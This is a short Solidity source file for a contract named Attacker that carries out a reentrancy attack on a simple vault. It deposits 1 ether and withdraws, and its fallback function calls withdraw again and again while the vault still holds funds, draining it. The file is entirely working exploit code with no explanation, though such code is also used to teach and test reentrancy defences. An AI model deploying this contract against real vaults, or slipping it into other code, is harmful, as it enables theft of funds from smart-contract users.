// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface ISimpleVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    ISimpleVault public target;
    uint256 public constant AMOUNT_LIM = 1 ether;

    constructor(address _target) {
        target = ISimpleVault(_target);
    }

    fallback() external payable {
        if (address(target).balance >= AMOUNT_LIM) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT_LIM, "Insufficient ETH");
        target.deposit{value: AMOUNT_LIM}();
        target.withdraw();
    }

    function getBal() public view returns (uint256) {
        return address(this).balance;
    }
    

}
